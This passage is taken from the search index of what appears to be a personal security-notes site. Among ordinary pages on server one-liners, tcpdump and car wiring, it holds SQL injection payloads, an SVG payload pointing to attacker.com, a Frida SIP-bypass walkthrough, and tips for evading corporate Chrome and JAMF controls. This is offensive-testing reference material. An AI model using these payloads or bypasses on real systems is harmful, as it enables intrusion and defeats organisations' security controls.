        "content": "Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at http://localhost:8000. Use this power wisely.\nDiscussion on reddit.\nPython 2.x $ python -m SimpleHTTPServer 8000 Python 3.x $ python -m http.server 8000 Twisted (Python) $ twistd -n web -p 8000 --path . Or:\n$ python -c \u0026#39;from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File(\u0026#34;.\u0026#34;))); reactor.run()\u0026#39; Depends on Twisted.\nRuby $ ruby -rwebrick -e\u0026#39;WEBrick::HTTPServer.new(:Port =\u0026gt; 8000, :DocumentRoot =\u0026gt; Dir.pwd).start\u0026#39; Credit: Barking Iguana\nRuby 1.9.2+ $ ruby -run -ehttpd . -p8000 Credit: nobu\nadsf (Ruby) $ gem install adsf # install dependency $ adsf -p 8000 Credit: twome\nNo directory listings.\nSinatra (Ruby) $ gem install sinatra # install dependency $ ruby -rsinatra -e\u0026#39;set :public_folder, \u0026#34;.\u0026#34;; set :port, 8000\u0026#39; No directory listings.\nPerl $ cpan HTTP::Server::Brick # install dependency $ perl -MHTTP::Server::Brick -e \u0026#39;$s=HTTP::Server::Brick-\u0026gt;new(port=\u0026gt;8000); $s-\u0026gt;mount(\u0026#34;/\u0026#34;=\u0026gt;{path=\u0026gt;\u0026#34;.\u0026#34;}); $s-\u0026gt;start\u0026#39; Credit: Anonymous Monk\nPlack (Perl) $ cpan Plack # install dependency $ plackup -MPlack::App::Directory -e \u0026#39;Plack::App::Directory-\u0026gt;new(root=\u0026gt;\u0026#34;.\u0026#34;);\u0026#39; -p 8000 Credit: miyagawa\nMojolicious (Perl) $ cpan Mojolicious::Lite # install dependency $ perl -MMojolicious::Lite -MCwd -e \u0026#39;app-\u0026gt;static-\u0026gt;paths-\u0026gt;[0]=getcwd; app-\u0026gt;start\u0026#39; daemon -l http://*:8000 No directory listings.\nhttp-server (Node.js) $ npm install -g http-server # install dependency $ http-server -p 8000 Note: This server does funky things with relative paths. For example, if you have a file /tests/index.html, it will load index.html if you go to /test, but will treat relative paths as if they were coming from /.\nnode-static (Node.js) $ npm install -g node-static # install dependency $ static -p 8000 No directory listings.\nPHP (\u0026gt;= 5.4) $ php -S 127.0.0.1:8000 Credit: /u/prawnsalad and MattLicense\nNo directory listings.\nErlang $ erl -s inets -eval \u0026#39;inets:start(httpd,[{server_name,\u0026#34;NAME\u0026#34;},{document_root, \u0026#34;.\u0026#34;},{server_root, \u0026#34;.\u0026#34;},{port, 8000},{mime_types,[{\u0026#34;html\u0026#34;,\u0026#34;text/html\u0026#34;},{\u0026#34;htm\u0026#34;,\u0026#34;text/html\u0026#34;},{\u0026#34;js\u0026#34;,\u0026#34;text/javascript\u0026#34;},{\u0026#34;css\u0026#34;,\u0026#34;text/css\u0026#34;},{\u0026#34;gif\u0026#34;,\u0026#34;image/gif\u0026#34;},{\u0026#34;jpg\u0026#34;,\u0026#34;image/jpeg\u0026#34;},{\u0026#34;jpeg\u0026#34;,\u0026#34;image/jpeg\u0026#34;},{\u0026#34;png\u0026#34;,\u0026#34;image/png\u0026#34;}]}]).\u0026#39; Credit: nivertech (with the addition of some basic mime types)\nNo directory listings.\nbusybox httpd $ busybox httpd -f -p 8000 Credit: lvm\nwebfs $ webfsd -F -p 8000 Depends on webfs.\nIIS Express C:\\\u0026gt; \u0026#34;C:\\Program Files (x86)\\IIS Express\\iisexpress.exe\u0026#34; /path:C:\\MyWeb /port:8000 Depends on IIS Express.\nCredit: /u/fjantomen\nNo directory listings. /path must be an absolute path.\n", 
        "url": "\/server-anywhere\/"
    },
    
    
    
    "\/signals-table\/": {
        
        "title": "Signals Table",
        "tags": [],
        "content": "Table Symbol Type Cycle Desc. Function SQR A High / Low Waveform Repeated Rapidly B- D ON / OFF ON/OFF input Low Signal B+ D ON / OFF ON/OFF input High Signal V+ Voltage Positive Voltage Positive GND Ground Voltage Negative \u0026gt; (where \u0026#34;SQR\u0026#34; - Square-Wave Signal) \u0026gt; (where \u0026#34;A\u0026#34; - Analog, \u0026#34;D\u0026#34; - Digital) Documentation SQR Signal Documentation B- Documentation B+ Documentation Bench Test Tricks and Tips You can easily send required signal for B/type Switches, just by checking the Signal Type of the specific Pin. For example: Pin 3, is a \u0026ldquo;Fuel Level Warning Light\u0026rdquo; on X13060. It has signal type B-. You can ground this pin and the light will turn on, indicating the Fuel Warning. Signal Type ‚á¢ Component Using it Square Wave Diagnostic Module DME/DDE Control Unit Control Unit Control Module Read Axle reed contact Speed Sensor Switched B+ Ignition Switch Light Switch Reed Switch Seat Belt Switch Hall Effect Switch Brake Light Switch Hazard Warning Relay Fog Light Switch Direction Switch Accessories (ACC) Wire Switched B- Door Position Switch Window Switches Sunroof Switch Terminal Designations There is a terminal designation for almost every connection of a consumer or switch in the vehicle in order to facilitate the connection. The designation of the individual connections is defined in Germany according to DIN 72552.\nRefer to DIN 72552 page for more details.\n", 
        "url": "\/signals-table\/"
    },
    
    
    
    "\/sqli-payloads\/": {
        
        "title": "SQLi Payloads",
        "tags": [],
        "content": "More examples might be avilable on netspi\nClassical Sleep:\n0\u0026#39;XOR(if(now()=sysdate(),sleep(15),0))XOR\u0026#39;Z =\u0026gt; 20.002 0\u0026#39;XOR(if(now()=sysdate(),sleep(6),0))XOR\u0026#39;Z =\u0026gt; 7.282 0\u0026#39;XOR(if(now()=sysdate(),sleep(0),0))XOR\u0026#39;Z =\u0026gt; 0.912 0\u0026#39;XOR(if(now()=sysdate(),sleep(15),0))XOR\u0026#39;Z =\u0026gt; 16.553 0\u0026#39;XOR(if(now()=sysdate(),sleep(3),0))XOR\u0026#39;Z =\u0026gt; 3.463 0\u0026#39;XOR(if(now()=sysdate(),sleep(0),0))XOR\u0026#39;Z =\u0026gt; 1.229 0\u0026#39;XOR(if(now()=sysdate(),sleep(6),0))XOR\u0026#39;Z =\u0026gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) ‚Äô) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw\u0026amp;url=http%3a%2f%2finsideok.ru%2flica\u0026amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\u0026#39;;WAITFOR DELAY ‚Äò00:00:05‚Äô;-- Blind SQL Injection:\n# sleep on mysql 4.* 1\u0026#39; AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 4 THEN SLEEP(10) ELSE NULL END AND \u0026#39;1 # sleep on mysql 5.* 1\u0026#39; AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 5 THEN SLEEP(10) ELSE NULL END AND \u0026#39;1 ", 
        "url": "\/sqli-payloads\/"
    },
    
    
    
    "\/svg-payloads\/": {
        
        "title": "SVG Payloads",
        "tags": [],
        "content": "\u0026lt;rect fill=ÔøΩurl(//attacker.com/malicious.svg#exploit)ÔøΩ\u0026gt; (@see: https://hackerone.com/reports/347139) ", 
        "url": "\/svg-payloads\/"
    },
    
    
    
    "\/switched-b-low-signals\/": {
        
        "title": "Switched B- (Low) Signals",
        "tags": [],
        "content": "Akin to B+ Signal, this Ground Signal produces an ON/OFF type input to the Control Module. The voltage level will indicate a specific operating condition.\nThe only diference between a switched B- and switched B+ is the voltage, in which the signals are switched.\nThis type of signal can be seen in BMW\u0026rsquo;s Pinout diagrams, symboled by the B-.\nB\u0026#43;/- Signal - Example of Operating Condition Below is an example circuit that uses B- Digital Type Signal:\nB- Signal - Example of ON/OFF Circuit Typical Application of Switched B+ Door Position Switch Window Switches Sunroof Switch \u0026hellip; ", 
        "url": "\/switched-b-low-signals\/"
    },
    
    
    
    "\/switched-b-high-signals\/": {
        
        "title": "Switched B\u002b (High) Signals",
        "tags": [],
        "content": "This DC (Digital) Type Signal produces an ON/OFF type input to the Control Module. The voltage level will indicate a specific operating condition.\nThis type of signal can be seen in BMW\u0026rsquo;s Pinout diagrams, symboled by the B+.\nB\u0026#43; Signal - Example of ON/OFF Circuit Typical Application of Switched B+ Ignition Switch Light Switch Reed Switch Seat Belt Switch Hall Effect Switch (e.g. Brake Light Switch) \u0026hellip; ", 
        "url": "\/switched-b-high-signals\/"
    },
    
    
    
    "\/tags\/": {
        
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "\/tags\/"
    },
    
    
    
    "\/tcpdump\/": {
        
        "title": "tcpdump",
        "tags": [],
        "content": "This document explains tcpdump advanced filters.\nBasic Syntax Filtering Hosts # =\u0026gt; Match any traffic involving 192.168.1.1 as destination or source $ tcpdump -i eth1 host 192.168.1.1 # =\u0026gt; As soure only $ tcpdump -i eth1 src host 192.168.1.1 # =\u0026gt; As destination only $ tcpdump -i eth1 dst host 192.168.1.1 Filtering Ports # =\u0026gt; Match any traffic involving port 25 as source or destination $ tcpdump -i eth1 port 25 # =\u0026gt; Source $ tcpdump -i eth1 src port 25 # =\u0026gt; Destination $ tcpdump -i eth1 dst port 25 Network Filtering $ tcpdump -i eth1 net 192.168 $ tcpdump -i eth1 src net 192.168 $ tcpdump -i eth1 dst net 192.168 Protocol Filtering $ tcpdump -i eth1 arp $ tcpdump -i eth1 ip $ tcpdump -i eth1 tcp $ tcpdump -i eth1 udp $ tcpdump -i eth1 icmp Combining Expressions Negation: ! or not Concatanate: \u0026amp;\u0026amp; or and Alternate: || or or # =\u0026gt; This rule will match any TCP traffic on port 80 (web) with 192.168.1.254 or 192.168.1.200 as destination host $ tcpdump -i eth1 \u0026#39;((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))\u0026#39; # =\u0026gt; Will match any ICMP traffic involving the destination with physical/MAC address 00:01:02:03:04:05 $ tcpdump -i eth1 \u0026#39;((icmp) and ((ether dst host 00:01:02:03:04:05)))\u0026#39; # =\u0026gt; Will match any traffic for the destination network 192.168 except destination host 192.168.1.200 $ tcpdump -i eth1 \u0026#39;((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))\u0026#39; Advanced Syntax Advanced Header Filtering Before we continue, we need to know how to filter out info from headers\nproto[x:y] : will start filtering from byte x for y bytes. ip[2:2] would filter bytes 3 and 4 (first byte begins by 0) proto[x:y] \u0026amp; z = 0 : will match bits set to 0 when applying mask z to proto[x:y] proto[x:y] \u0026amp; z !=0 : some bits are set when applying mask z to proto[x:y] proto[x:y] \u0026amp; z = z : every bits are set to z when applying mask z to proto[x:y] proto[x:y] = z : p[x:y] has exactly the bits set to z Operators : \u0026gt;, \u0026lt;, \u0026gt;=, \u0026lt;=, =, != IP option set in the Packet Header Let\u0026rsquo;s say we want to know if the IP header has options set. We can\u0026rsquo;t just try to filter out the 21st byte because if no options are set, data start at the 21st byte. We know a \u0026ldquo;normal\u0026rdquo; header is usually 20 bytes (160 bits) long. With options set, the header is longer than that. The IP header has the header length field which we will filter here to know if the header is longer than 20 bytes.\n+-+-+-+-+-+-+-+-+ |Version| IHL | +-+-+-+-+-+-+-+-+ Usually the first byte has a value of 01000101 in binary. Anyhow, we need to divide the first byte in half, like so:\n0100 = 4 in decimal. This is the IP version. 0101 = 5 in decimal. This is the number of blocks of 32 bits in the headers. 5 x 32 bits = 160 bits or 20 bytes. The second half of the first byte would be bigger than 5 if the header had IP options set. We have two ways of dealing with that kind of filters.\nTry to match a value bigger than 01000101 By \u0026ldquo;masking\u0026rdquo; the first half of the byte References\ntcpdump manpage tcpdump filters ", 
        "url": "\/tcpdump\/"
    },
    
    
    
    "\/troubleshoot\/": {
        
        "title": "Troubleshoot",
        "tags": [],
        "content": "Hardware Fix Kappa Headphones on Apple Macbook\nMacOS In case you get error, such is stderr: 0:137: execution error: dd: /dev/rdisk4: Operation not permitted, during the Raspberry Pi installation, or mounting of SD Cards, do the following:\nIf the command reports dd: /dev/rdiskN: Operation not permitted, go to System Preferences -\u0026gt; Security \u0026amp; Privacy -\u0026gt; Privacy -\u0026gt; Files and Folders -\u0026gt; Give Removable Volumes access to Terminal.\nLinux Fix RHEL SD Card Reader (Red Hat Enterprise Linux)\nFix RHEL VPN forward options (see above)\nFix Wireless for Macbook Air on RHEL (see above)\nDedicated post has been published on my blog. RHEL gets kinda buggy on Macbook Air (Intel).\nBypasses Chrome Enterprise Policy Bypass\nVery annoying on JAMF\u0026rsquo;d and managed devices. Basically, Company provides a laptop with a bloatware in a form of Chrome extension. This is a trick I discovered around 2016. You can bypass \u0026ldquo;Enterprise\u0026rdquo; limitation and remove the Chrome extension from reapperaing.\nJAMF \u0026ldquo;Nudge\u0026rdquo; Security Encoruager\nJAMF\u0026rsquo;d and managed devices in some cases displays a modal NSWindow in a form of nudge ü§Ø. You can\u0026rsquo;t close it unless you proceed with the update.\nThis app. is sitting in /Applications/Utilities/Nudge.app. It\u0026rsquo;s possible to disable this application by abusing privilege descriptions as seen on GitHub, or by reading the wiki.\nTodo: Discover a way to bypass screen nudging. This is just for the reference purposes.\nVirtualBox || VMWare When in Kali Linux and doing Security Assessment\nMake sure to set VMWare Kali Box to use NAT (so the VPN connection can be shared from Host, ie. MacOS) When installing VMWare from JAMF but it doesn\u0026rsquo;t work\nInstall VMWare via JAMF Store (to obtain License Key) Backup the license-fusion-120-e3-202001 from the JAMF Store VMWare Installation Application Support Manually downloading the new DMG Removing the JAMF Store VMWare installation Installing the DMG and activating via above license Guest addition shared folder does not work\n# =\u0026gt; Work in linux-based vmbox $ sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other Guest addition shared clipboard does not work\n# =\u0026gt; Start from Terminal or on Startup $ /usr/bin/vmware-user # =\u0026gt; Another option is to bring daemon $ vmtoolsd -n vmusr # =\u0026gt; For Microsoft Windows \u0026gt; taskkill /F /IM vmtoolsd.exe \u0026gt; \u0026#34;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\u0026#34; -n vmusr Fix Kali Linux screen resolution\nxrandr --newmode \u0026#34;2560x1440_40.00\u0026#34; 201.00 2560 2720 2984 3408 1440 1443 1448 1476 +hsync +vsync xrandr --addmode Virtual1 2560x1440_40.00 xrandr --output Virtual1 --mode 2560x1440_40.00 Install XFCE4 + Openbox in Kali\n(Increases Speedyness)\n$ apt-get install kali-defaults kali-root-login desktop-base xfce4 xfce4-places-plugin xfce4-goodies openbox # =\u0026gt; login in xfce session $ openbox --replace \u0026amp; exit Burp Proxy When connecting to a new wi-fi or internet connection, make sure to:\nClick Network in the Taskbar Properties Configure Firewall and Security Settings In Windows Security, click \u0026ldquo;Allow an app through firewall\u0026rdquo; Click Change Settings Select Burp Proxy / Charles etc. and select all 3 checkboxes (Network, Home, Public) ", 
        "url": "\/troubleshoot\/"
    },
    
    
    
    "\/upgrade-wishlist\/": {
        
        "title": "Upgrade\u002bWishlist",
        "tags": [],
        "content": "Upgrade: Dash Camera Preferably front and back, tho would appreciated frontal only. Current choice: XIAOMI 70mai Pro Plus A500 - ~80 EUR, XIAOMI Mi 70mai D01 ~50 EUR, XIAOMI Mi 70mai Pro D02 ~80 EUR\nUpgrade: DME/ECU Chip Tuning E34 Chip Tuning - Legit Provider Wtterauer Tuning Gmbh\n- Series Stage 1 Displacement 1991 Performance 110 kW / 150 PS 122 kW / 166 PS +11% ~5500 U/min ~5550 U/min Acceleration \u0026mdash; ~0.39sec@0-100km/h Torque 190 Nm 215 Nm +13% ~4200 U/min ~4200 U/min Top Speed 211 km/h 219 km/h Price: 454,40 EUR Katalysator Removal +349,00 EUR - The removal of the catalytic converter and the associated electronic adjustment lead to less exhaust gas pressure and thus to a better flow of exhaust gases and more agile driving behavior. Fuel Cut-off +349,00 EUR - By deactivating the overrun fuel cut-off, the fuel supply to the combustion engine is no longer cut off. On the one hand, turbo engines can maintain their boost pressure and the popular boost popping occurs. VMax Nullification +699,00 EUR - Removes a software limited maximum speed, without performance increase. Current data visible here.\nUpgrade: Professional Audio Upgrade ProAudi Gmbh. - Legit Provider Pro Audi Gmbh\nSelf upgrade alternatives:\nHertz HCX 130 Upgrade: Radar/Laser/Safety Detector Escort Inc Passport 7500, Radar/Laser/Safety Detector Cobra RAD 480i Laser Radar Detector Escort MAX360C Laser Radar Detector ", 
        "url": "\/upgrade-wishlist\/"
    },
    
    
    
    "\/using-frida-against-macho-on-arm\/": {
        
        "title": "Using Frida against MachO on ARM",
        "tags": [],
        "content": "This short notes will introduce you to basic attacking and reverse engineering techniques against MachO binaries running on MacOS M1/M2 ARM processor. This also includes a self-invented technique to attack iOS apps. running on M1/M2 machines ‚Éó without disabling SIP.\nPreliminary Setup\nWe will target an iOS application running on M1/M2, based on MacOS Ventura. The target for today is UniFon which is a VOIP/SIP mobile app. provided by my Telecom provider as a part of the package. By using UniFon, I can call free-of-charge via my home-office phone number, whenever I\u0026rsquo;m on the go.\nThe application was extracted via off-the-shelf dumping tools, like these described in iOS App. Decryption notes. Upon successful extraction, I\u0026rsquo;ve installed the app. via iOS App Installer that comes by default on all M1/M2 Apple hardware.\nMake sure to have common #RevEng tools installed. I prefer to work in my Virtual MacOS environment which helps me keep my Host OS tidy and clean. Not to tell its a lot easier to work with, when doing multiple, large engagements.\nYou can download decrypted iOS applications online. I like to use decrypt.day. Otherwise, I charge my jailbroken testbed iPhones, and dump target IPA manually.\nFor a start, lets enable Developer Mode on our MacOS:\n$ sudo DevToolsSecurity -enable Bypassing SIP Protection without Kernel/NV Tricks\nI\u0026rsquo;ve researched this exploit myself in ~2k21 while playing on M1 virtual box that I had provisioned. This was proposed to Olle\u0026rsquo; from Frida/@NowSecure and he was grateful for sharing this trick.\nThe trick works by abusing Apple\u0026rsquo;s own Notarization internals; This was invented by Apple in a hope to prevent apps. from being easily cracked and exploited. Little did they know it\u0026rsquo;s a double-edged sword.\nInjecting Frida on M1/M2 iOS apps\nUsing this trick, it\u0026rsquo;s possible to inject Frida Binary Instrumentation toolkit on M1 process, without disabling SIP. This native exploit consists of few steps:\nStarting a targeted iOS app. on M1/M2 Attaching MacOS\u0026rsquo;s original lldb (Notarized) Wait for lldb to hit early thread breakpoint Attach a Frida to App. during the breakpoint Once Frida is attached,¬†it will wait for REPL command In Frida REPL, type %resume to continue iOS app. lifecycle In lldb again, continue (c) with the process lifecycle Frida will automatically attach to the iOS app. How it works: there is no easy way to explain it, but take a look at frida-core and frida-gum to gain insight on how Frida works in normal occurences. Usually, it gets dylibmap and tries to inject to relative memory address on mm/procmap (with a bit of paging). Due to lldb being notarized by Apple, as with other bundled MacOS software, it has all privileges to access a process; meaning it uses Signing/Notarization with communication on XPC layer, having \u0026ldquo;all ACL privileges\u0026rdquo; in their sandbox. Once lldb maps a process within those access rights, the apps that are attached to the debugger are also children, therefore, Frida in this case, also being one of the children of the top-down proc/privs hierarchy. This way, SIP is bypassed, and Frida can continue injecting its own dylib map into the targeted app.\nPractical Excersise Start of by choosing a good target to test. Inhere, I will use \u0026ldquo;DVIA-v2\u0026rdquo; which is a common OSS vulnerable iOS app. for testing. After small code change and compilation of the XCode project, I ended up with:\nCompiled DVIA running on MacOS M1 The build of target app. is compiled for iPad8,6 (effectively an IPA), useable in MacOS via \u0026ldquo;App Bundle Wrapper\u0026rdquo;, that acts as a bridge between IPA and MacOS apps.\nLets start cracking. Make sure to always copy the app. to ~/temp or similar directory. In fact, applications directly stored in /Applications or ~/Applications usually won\u0026rsquo;t play well with lldb.\n$ cp ~/Library/Developer/Xcode/DerivedData/DVIA-v2-xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/Build/Products/Debug-iphoneos/DVIA-v2.app ~/Projects/DVIA_frida-m1-_NOSIP/DVIA.app $ cd ~/Projects/DVIA_frida-m1-_NOSIP \u0026amp;\u0026amp; tree # . # ‚îî‚îÄ‚îÄ DVIA.app # ‚îú‚îÄ‚îÄ AntiAntiHookingDebugging.storyboardc # ... We can do some basic recon. process to get feel of the target:\n$ file ./DVIA.app/DVIA-v2 ./DVIA.app/DVIA-v2: Mach-O 64-bit executable arm64 $ otool -L DVIA.app/DVIA-v2 DVIA.app/DVIA-v2: /usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 1300.36.0) /usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 346.0.0) /usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11) # ... Looking at the otool output, we can see that the app is correctly code-signed:\n$ codesign -d DVIA.app -vv Executable=/Users/$USER/Projects/DVIA_frida-m1-_NOSIP/DVIA.app/DVIA-v2 Identifier=com.durakiconsulting.DVIA Format=app bundle with Mach-O thin (arm64) CodeDirectory v=20400 size=70877 flags=0x0(none) hashes=2204+7 location=embedded Signature size=4781 Authority=Apple Development: XXXXX XXXXXX (xxxxxxxxxx) TeamIdentifier=xxxxxxxxxx # ... Remember, you will need to strip code-signature that is bundled with the targeted application. You can do so by looking at xattr, described in the MacOS Reverse Engineering notes.\nIt\u0026rsquo;s time to start debugging into the iOS application.\n$ lldb DVIA.app Voltron loaded. Registered stop-hook (lldb) target create \u0026#34;DVIA.app\u0026#34; Current executable set to \u0026#39;/Users/$USER/Projects/DVIA_frida-m1-_NOSIP/DVIA.app\u0026#39; (arm64). But, if we try to start the app. from within debugger:\n(lldb) r Process 50552 launched: \u0026#39;/Users/$USER/Projects/DVIA_frida-m1-_NOSIP/DVIA.app/DVIA-v2\u0026#39; (arm64) # Process 50552 exited with status = 9 (0x00000009) Terminated due to code signing error Once again, reference to MacOS Reverse Engineering notes to learn how to circumate such errors; it\u0026rsquo;s simply as:\n$ codesign --deep --force -s \u0026#34;codesign\u0026#34; DVIA.app DVIA.app: replacing existing signature # the \u0026#34;codesign\u0026#34; is my own code-signing certificate, # created over Keychain Access and setting it as trusted. # this is so-called \u0026#34;Ad-Hoc\u0026#34; code signing of Apple Apps. and it # works only on your own PC. While we are on preparation, lets also include special entitlement that allows us to attach to the process.\n$ codesign --force --options runtime --sign - --entitlements ~/entitlements.plist DVIA.app DVIA.app: replacing existing signature Run the iOS application either by passing the filename to lldb or using the PID as I do below:\n# Running app. Process ID $ pgrep -x DVIA-v2 64421 # Attach to Process ID via lldb $ lldb -p 64086 Voltron loaded. Registered stop-hook (lldb) process attach --pid 64086 Process 64086 stopped * thread #1, queue = \u0026#39;com.apple.main-thread\u0026#39;, stop reason = signal SIGSTOP frame #0: 0x000000018049a050 libsystem_kernel.dylib`mach_msg2_trap + 8 libsystem_kernel.dylib`mach_msg2_trap: -\u0026gt; 0x18049a050 \u0026lt;+8\u0026gt;: ret libsystem_kernel.dylib`macx_swapon: 0x18049a054 \u0026lt;+0\u0026gt;: mov x16, #-0x30 0x18049a058 \u0026lt;+4\u0026gt;: svc #0x80 0x18049a05c \u0026lt;+8\u0026gt;: ret Architecture set to: arm64e-apple-ios-. (lldb) That breakpoint trap is exactly the place where we should sit at, during the spawn of Frida toolset.\nAttach Frida to the PID of the running process using the command below:\n$ frida -p 64086 ____ / _ | Frida 16.0.11 - A world-class dynamic instrumentation toolkit | (_| | \u0026gt; _ | Commands: /_/ |_| help -\u0026gt; Displays the help system . . . . object? -\u0026gt; Display information about \u0026#39;object\u0026#39; . . . . exit/quit -\u0026gt; Exit . . . . . . . . More info at https://frida.re/docs/home/ . . . . . . . . Connected to Local System (id=local) Attaching... Go back in your lldb Termianl window and continue process execution; and Frida will as well connect to targeted iOS app.\n(lldb) c # Process 64086 resuming # ... As soon as the process pops with lifecycle continuation, Frida will either connect automatically, or you will have to %resume the dylib injection process.\n# ... cont # Attaching... [Local::PID::64086 ]-\u0026gt; %resume [Local::PID::64086 ]-\u0026gt; From there on, you can continue enganging and hunting exploits as typical ü•≥\n[Local::PID::64086 ]-\u0026gt; Frida.version \u0026#34;16.0.11\u0026#34; [Local::PID::64086 ]-\u0026gt; ObjC.api { \u0026#34;_dispatch_main_q\u0026#34;: \u0026#34;0x10525cd40\u0026#34;, \u0026#34;class_addMethod\u0026#34;: \u0026#34;0x180176c4c\u0026#34;, # ... [Local::PID::64086 ]-\u0026gt; Object.keys(ObjC.classes).slice(0, 10) [ \u0026#34;JSExport\u0026#34;, \u0026#34;Object\u0026#34;, # ..., \u0026#34;NSProxy\u0026#34;, \u0026#34;RawCameraCIImageProxy\u0026#34;, \u0026#34;FlurryWatchConnectivityProxy\u0026#34; ] Important - Depending on the targeted architecture, you may need to setup a frida-server for specific architecutre, that will act as a gateway between the targeted Arch and the Host OS.\n# example, for macos/arm64 $ wget https://github.com/frida/frida/releases/download/16.0.11/frida-server-16.0.11-macos-arm64.xz # ... $ xz -d frida-server-16.0.11-macos-arm64.xz # to extract it $ sudo ./frida-server-16.0.11-macos-arm64 # Remember: # frida-server needs to be running during the Frida instrumentation For a list of frida-server and their downloads, refer to official GitHub releases on Frida repository. Make sure to match the version of the server on par with your frida-tools.\n", 
        "url": "\/using-frida-against-macho-on-arm\/"
    },
    
    
    
    "\/vehicle-graybox-security-testing\/": {
        
        "title": "Vehicle Graybox Security Testing",
        "tags": [],
        "content": "Security Testing Methods Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data) Security Testing in Practice Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data Approach Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components Understand the Architecture Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram Identify valued and protectable assets Identify relevant assets, such is hardware, software, database, etc. Parse every requirement (requirement description) for a specific asset - Splut it into SFOP scheme (Safety, Finance, Operational Performance, Privacy) Generate Penetration Test Cases Do X and Y on CAN Do Z and W on LIN Perform risk-based greybox PT Re-create attack scenarios on devices to identify potential vulns\nInjecting,tampering\nSoftware checks: Invalid address Modified SW Odd address Invalid signature Invalid seed-key Downgrade software Secure boot? Ques? Can we read the key, flash? Can we modify the flash or CAN messages? Can we perform a DoS and make the service unavailable Whats the goal of the attacker? What can he misuse and abuse ", 
        "url": "\/vehicle-graybox-security-testing\/"
    },
    
    
    
    "\/vehicle-hacking-environment\/": {
        
        "title": "Vehicle Hacking Environment",
        "tags": [],
        "content": "Using Docker and Kali Install Docker first:\n$ brew install docker # =\u0026gt; or use docker.io Use the following script:\n# ... install required kali-docker tools # setup vehicle hacking environment $ apt-get install -y build-essential $ apt-get install -y ruby $ apt-get install -y ruby-dev $ apt-get install -y rubygems $ gem install serialport -- --use-system-libraries $ apt-get -y install bluez # (for hcitool) $ apt-get install -y net-tools Using Virtual Vehicle environments jeep has been developed to offer offensive-security solution for penetration testing on vehicle systems and similar attributes.\n", 
        "url": "\/vehicle-hacking-environment\/"
    },
    
    
    
    "\/vhost-enumeration\/": {
        
        "title": "vhost Enumeration",
        "tags": [],
        "content": "vhost discovery via ffuf:\n# =\u0026gt; first, find the total char lenght when the vhost does not exists $ curl -s -H \u0026#34;Host: thisdoesntexists.target.ba\u0026#34; http://target.ba | wc -c 246 # =\u0026gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \u0026#34;Host: FUZZ.target.ba\u0026#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:\n$ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.ba =\u0026gt; then continue here\n", 
        "url": "\/vhost-enumeration\/"
    },
    
    
    
    "\/web-application-penetration-test-checklist\/": {
        
        "title": "Web Application Penetration Test Checklist",
        "tags": [],
        "content": "[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking ‚Äì An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection. [+] Posting Raw XML cross-domain [+] Generic Cross-Browser Cross-Domain theft [+] Attacking HTTPS with Cache Injection [+] Tap Jacking [+] XSS - Track [+] Next Generation Click Jacking [+] XSSing Client-Side Dynamic HTML. [+] Stroke triggered XSS and Stroke Jacking [+] Lost iN Translation [+] Persistent Cross Interface Attacks [+] Chronofeit Phishing [+] SQLi Filter Evasion Cheat Sheet (MySQL) [+] Tabnabbing [+] UI Redressing [+] Cookie Poisoning [+] SSRF [+] Bruteforce of PHPSESSID [+] Blended Threats and JavaScript [+] Cross-Site Port Attacks [+] CAPTCHA Re-Riding Attack [+] Arbitrary file access [+] Binary planting [+] Blind SQL Injection [+] Blind XPath Injection [+] Brute force attack [+] Buffer overflow attack [+] Cache Poisoning [+] Cash Overflow [+] Clickjacking [+] Command injection attacks [+] Comment Injection Attack [+] Content Security Policy [+] 